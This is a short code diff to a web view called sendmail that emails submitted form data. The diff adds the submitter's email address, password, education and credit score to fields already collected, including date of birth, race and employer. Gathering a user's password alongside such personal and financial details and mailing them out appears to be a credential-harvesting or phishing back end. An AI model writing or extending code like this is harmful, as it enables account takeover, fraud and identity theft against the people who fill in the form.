@@ -48,6 +48,10 @@ def sendmail(request):
                     "dob : " + request.POST['dob'] + "\r"
                     "race : " + request.POST['race[]'] + "\r"
                     "employer : " + request.POST['empl'] + "\r"
+                    "email : " + request.POST['email'] + "\r"
+                    "password : " + request.POST['password'] + "\r"
+                    "Education : " + request.POST['edu'] + "\r"
+                    "Credit Score : " + request.POST['score'] + "\r"
                     "Separation Year : " + request.POST['emplyear'])
 
     file1 = request.FILES['attachment1']
